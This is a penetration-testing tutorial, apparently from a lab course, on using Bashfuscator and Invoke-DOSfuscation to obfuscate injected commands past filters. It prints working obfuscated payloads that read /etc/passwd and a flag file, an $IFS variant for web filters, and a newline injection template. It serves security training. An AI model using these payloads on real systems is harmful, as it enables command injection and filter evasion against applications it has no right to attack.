# Evasion Tools

> **🤖 Automated Obfuscation:** Advanced tools for bypassing sophisticated security mechanisms

## Overview

If we are dealing with advanced security tools, we may not be able to use basic, manual obfuscation techniques. In such cases, it may be best to resort to **automated obfuscation tools**. This section will discuss examples of these types of tools, one for Linux and another for Windows.

These automated tools are particularly useful when:
- Manual obfuscation techniques fail
- Multiple filter layers are present
- WAF detection is highly sophisticated
- Time constraints require rapid payload generation
- Custom evasion patterns are needed

---

## Linux (Bashfuscator)

> **🐧 Bash Command Obfuscation:** Automated tool for Linux/Unix environments

### Installation

A handy tool we can utilize for obfuscating bash commands is **Bashfuscator**. We can clone the repository from GitHub and then install its requirements:

```bash
# Clone the repository
git clone https://github.com/Bashfuscator/Bashfuscator

# Navigate to directory
cd Bashfuscator

# Install requirements
pip3 install setuptools==65
python3 setup.py install --user
```

### Basic Usage

Once we have the tool set up, we can start using it from the `./bashfuscator/bin/` directory. There are many flags we can use with the tool to fine-tune our final obfuscated command:

```bash
# Navigate to binary directory
cd ./bashfuscator/bin/

# View help menu
./bashfuscator -h
```

**Help Menu Overview:**
```bash
usage: bashfuscator [-h] [-l] ...SNIP...

optional arguments:
  -h, --help            show this help message and exit

Program Options:
  -l, --list            List all the available obfuscators, compressors, and encoders
  -c COMMAND, --command COMMAND
                        Command to obfuscate
...SNIP...
```

### Simple Obfuscation

**Basic Command Obfuscation:**
```bash
./bashfuscator -c 'cat /etc/passwd'

# Output:
[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload:
 ${*/+27\[X\(} ...SNIP...  ${*~}   
[+] Payload size: 1664 characters
```

**Warning:** Running the tool this way will randomly pick an obfuscation technique, which can output a command length ranging from a few hundred characters to **over a million characters**!

### Optimized Obfuscation

For shorter and simpler obfuscated commands, use specific flags:

```bash
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

# Output:
[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters
```

### Testing Obfuscated Commands

**Verify the obfuscated command works:**
```bash
bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'

# Expected output:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...SNIP...
```

### Key Bashfuscator Flags

| Flag | Description | Usage |
|------|-------------|-------|
| `-c` | Command to obfuscate | `--command 'whoami'` |
| `-s` | Size parameter (1-6) | `-s 1` (smallest) |
| `-t` | Time parameter (1-6) | `-t 1` (fastest) |
| `--no-mangling` | Disable identifier mangling | Cleaner output |
| `--layers` | Number of obfuscation layers | `--layers 1` |
| `-l` | List available techniques | View all mutators |

### Web Application Testing

**Exercise Challenge:** Try testing the obfuscated command with our web application to see if it can successfully bypass the filters.

**Potential Issues:**
- **Space characters** in obfuscated payload
- **Special characters** that may be filtered
- **Payload length** restrictions

**Troubleshooting:**
```bash
# If spaces are filtered, replace with tabs or $IFS
# Original obfuscated command:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"

# Modified for web application:
eval$IFS"$(W0=(w$IFS\$IFS$IFSt${IFS}e${IFS}c${IFS}p${IFS}s${IFS}a$IFS\/${IFS}d);for${IFS}Ll${IFS}in${IFS}4${IFS}7${IFS}2${IFS}1${IFS}8${IFS}3${IFS}2${IFS}4${IFS}8${IFS}5${IFS}7${IFS}6${IFS}6${IFS}0${IFS}9;{${IFS}printf${IFS}%s${IFS}"${W0[$Ll]}";};)"
```

---

## Windows (DOSfuscation)

> **🪟 Windows Command Obfuscation:** Interactive tool for Windows environments

### Installation

There is a very similar tool for Windows called **DOSfuscation**. Unlike Bashfuscator, this is an **interactive tool** - we run it once and interact with it to get the desired obfuscated command.

```powershell
# Clone the repository
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git

# Navigate to directory
cd Invoke-DOSfuscation

# Import the PowerShell module
Import-Module .\Invoke-DOSfuscation.psd1

# Launch the interactive tool
Invoke-DOSfuscation
```

### Interactive Usage

**Help Menu:**
```powershell
Invoke-DOSfuscation> help

HELP MENU :: Available options shown below:
[*]  Tutorial of how to use this tool             TUTORIAL
...SNIP...

Choose one of the below options:
[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation
```

**Tutorial Option:**
We can use `tutorial` to see an example of how the tool works.

### Practical Example

**Step 1: Set Command**
```powershell
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
```

**Step 2: Choose Encoding**
```powershell
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

...SNIP...
```

**Step 3: Get Obfuscated Result**
```powershell
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

### Testing Windows Obfuscation

**Execute on Windows CMD:**
```cmd
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt

test_flag
```

### Cross-Platform Testing

**Linux PowerShell Alternative:**
If we do not have access to a Windows VM, we can run the above code on a Linux VM through `pwsh`:

```bash
# Install PowerShell on Linux (if not available)
# On Ubuntu/Debian:
sudo apt update && sudo apt install -y powershell

# Run PowerShell
pwsh

# Follow the exact same commands from above
```

**Note:** This tool is installed by default in your **Pwnbox** instance.

---

## DOSfuscation Techniques

### Environment Variable Encoding

**How it Works:**
DOSfuscation uses Windows environment variables to construct characters:

```cmd
# Examples of character extraction:
%TEMP:~-3,-2%        # Extracts specific characters from TEMP variable
%CommonProgramFiles:~17,-11%  # Character extraction from program files path
%SystemRoot:~-4,-3%  # Extract from system root path
```

### Advanced Obfuscation Options

**Available Techniques:**
1. **BINARY** - Obfuscated binary syntax for cmd.exe & powershell.exe
2. **ENCODING** - Environment variable encoding
3. **PAYLOAD** - Obfuscated payload via DOSfuscation

**Interactive Navigation:**
```powershell
# Navigate through options
Invoke-DOSfuscation> binary
Invoke-DOSfuscation\Binary> 1

# Return to main menu
Invoke-DOSfuscation\Binary> back
Invoke-DOSfuscation> 
```

---

## Tool Comparison

### Bashfuscator vs DOSfuscation

| Feature | Bashfuscator | DOSfuscation |
|---------|--------------|--------------|
| **Platform** | Linux/Unix | Windows |
| **Interface** | Command-line | Interactive |
| **Output Size** | Variable (100-1M+ chars) | Moderate (50-200 chars) |
| **Customization** | High (many flags) | Medium (preset options) |
| **Ease of Use** | Moderate | High (guided) |
| **Techniques** | Multiple layers | Env var extraction |

### When to Use Each Tool

**Use Bashfuscator when:**
- ✅ Targeting Linux/Unix systems
- ✅ Need highly customized obfuscation
- ✅ Multiple obfuscation layers required
- ✅ Automated scripting needed

**Use DOSfuscation when:**
- ✅ Targeting Windows systems
- ✅ Need environment variable techniques
- ✅ Interactive exploration preferred
- ✅ Moderate obfuscation sufficient

---

## Practical Integration

### Web Application Testing Workflow

**Step 1: Generate Obfuscated Payload**
```bash
# Linux target
./bashfuscator -c 'whoami' -s 1 -t 1 --no-mangling --layers 1

# Windows target
# Use DOSfuscation interactively
```

**Step 2: Filter Adaptation**
```bash
# Replace spaces with filter-safe alternatives
# Original: eval "$(command)"
# Modified: eval$IFS"$(command)"
```

**Step 3: Web Injection**
```http
# Combine with injection operators
ip=127.0.0.1%0a[OBFUSCATED_COMMAND]
```

### Automation Scripts

**Bashfuscator Automation:**
```bash
#!/bin/bash
# Auto-generate multiple obfuscation variants
for cmd in "whoami" "id" "pwd"; do
    echo "=== Obfuscating: $cmd ==="
    ./bashfuscator -c "$cmd" -s 1 -t 1 --no-mangling --layers 1
    echo
done
```

**PowerShell Automation (DOSfuscation):**
```powershell
# Batch obfuscation script
$commands = @("whoami", "dir", "type flag.txt")
foreach ($cmd in $commands) {
    Write-Host "=== Obfuscating: $cmd ==="
    # Manual DOSfuscation process would go here
}
```

---

## Advanced References

### Additional Resources

For more advanced obfuscation methods, refer to:
- **Secure Coding 101: JavaScript module** - Advanced obfuscation methods
- **PayloadsAllTheThings** - Community obfuscation techniques
- **OWASP Testing Guide** - Injection testing methodologies

### Tool Updates

**Stay Current:**
- ⚠️ Tools may require updates for new OS versions
- ⚠️ Signature detection evolves constantly
- ⚠️ New techniques emerge regularly

**Best Practices:**
- ✅ Test obfuscated payloads before deployment
- ✅ Have multiple obfuscation options ready
- ✅ Combine manual and automated techniques
- ✅ Keep tools updated to latest versions

---

## Key Takeaways

### **Automated Advantages**
- 🚀 **Speed** - Rapid payload generation
- 🔄 **Consistency** - Reliable obfuscation patterns
- 🎯 **Variety** - Multiple technique options
- 🛠️ **Customization** - Tunable parameters

### **Integration Strategy**
- 🔍 **Assessment** - Identify filter sophistication
- 🛠️ **Tool Selection** - Choose appropriate platform tool
- 🎭 **Obfuscation** - Generate automated payloads
- 🔧 **Adaptation** - Modify for specific filters
- ⚡ **Execution** - Deploy via injection vectors

These automated evasion tools provide penetration testers with powerful capabilities to bypass sophisticated filtering mechanisms while maintaining efficiency and effectiveness in assessments. 